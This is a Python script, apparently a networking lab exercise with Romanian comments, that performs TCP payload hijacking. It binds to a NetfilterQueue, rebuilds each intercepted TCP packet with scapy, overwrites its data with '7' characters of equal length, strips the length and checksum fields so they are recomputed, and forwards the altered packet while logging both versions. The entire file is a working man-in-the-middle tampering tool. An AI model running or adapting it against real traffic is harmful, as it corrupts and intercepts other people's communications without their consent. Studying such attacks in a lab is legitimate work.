from netfilterqueue import NetfilterQueue # intercepteaza pachetele la lvl de kernel
from scapy.all import IP, TCP, Raw

hijackCharacter = b'7'

def tcpHijacking(packet):

    # sa ia continutul pachetului ca bytes
    # se "reconstruieste" in format scapy cu functia IP
    pacht = IP(packet.get_payload())  
    
    
    # verificam daca pachetul e dintr-o conexiune TCP si daca contine date folositoare (gen nu headere sau ceva)
    if pacht.haslayer(TCP) and pacht.haslayer(Raw):
    	
    	# payload-ul original care se vrea transmis
        pachtOriginal = pacht[Raw].load 
        
        # mesajul modificat va avea aceeasi lungima ca si cel original, dar va avea chr egale cu hijackCharacter
        pachtInlocuit = hijackCharacter * len(pachtOriginal) 
        
        # adaugam payload-ul fake
        pacht[TCP].remove_payload()
        pacht[TCP].add_payload(Raw(load=pachtInlocuit))

        del pacht[IP].len # len total pachet
        del pacht[IP].chksum # suma de control pt det erori in header-ul Ip ului
        del pacht[TCP].chksum # suma de control pt integritatea esg TCP


	# inlocuim pachetul oroginal cu cel fake 
        packet.set_payload(bytes(pacht))

        print(f"MODIFICAT {pacht[IP].src}:{pacht[TCP].sport} -> {pacht[IP].dst}:{pacht[TCP].dport} | {pachtOriginal.decode(errors='ignore')} -> {pachtInlocuit.decode()}")



    # trimitem pachetul
    packet.accept()


nfqueue = NetfilterQueue()
nfqueue.bind(1, tcpHijacking) #nfq cu id 1


try:
    print("[] TCP HIJACKING -> pornit")
    nfqueue.run() 
except KeyboardInterrupt:
    print("\n[] TCP HIJACKING -> oprit")

finally:
    nfqueue.unbind()

